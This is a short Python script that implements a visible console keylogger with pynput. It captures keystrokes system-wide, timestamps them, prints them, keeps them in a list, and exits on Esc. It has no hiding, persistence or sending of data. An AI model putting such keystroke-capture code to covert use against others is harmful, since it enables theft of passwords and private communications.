from pynput import keyboard
from datetime import datetime
import threading
import time

class Keylogger:
    def __init__(self):
        self.key_log = []  # To store the logged keys
        self.dialog_open = False  # Flag to track if the dialog is open

    def log_key(self, key):
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            # Log the key and the timestamp
            if hasattr(key, 'char') and key.char:
                print(f"[{timestamp}] {key.char}")
                self.key_log.append(f"[{timestamp}] {key.char}")
            elif key == keyboard.Key.f1:
                print(f"[{timestamp}] F1 key pressed")
                self.key_log.append(f"[{timestamp}] F1 key pressed")
            elif key == keyboard.Key.f2:
                print(f"[{timestamp}] F2 key pressed")
                self.key_log.append(f"[{timestamp}] F2 key pressed")
            elif key == keyboard.Key.f3:
                print(f"[{timestamp}] F3 key pressed")
                self.key_log.append(f"[{timestamp}] F3 key pressed")
        except AttributeError:
            pass

    def on_press(self, key):
        # Log the key press
        self.log_key(key)

        # Exit on Esc key
        if key == keyboard.Key.esc:
            print("\nExiting program.")
            return False

def main():
    keylogger = Keylogger()
    print("Starting keylogger... Press ESC to exit")

    with keyboard.Listener(on_press=keylogger.on_press) as listener:
        listener.join()

    print("\nProgram ended.")

if __name__ == "__main__":
    main()

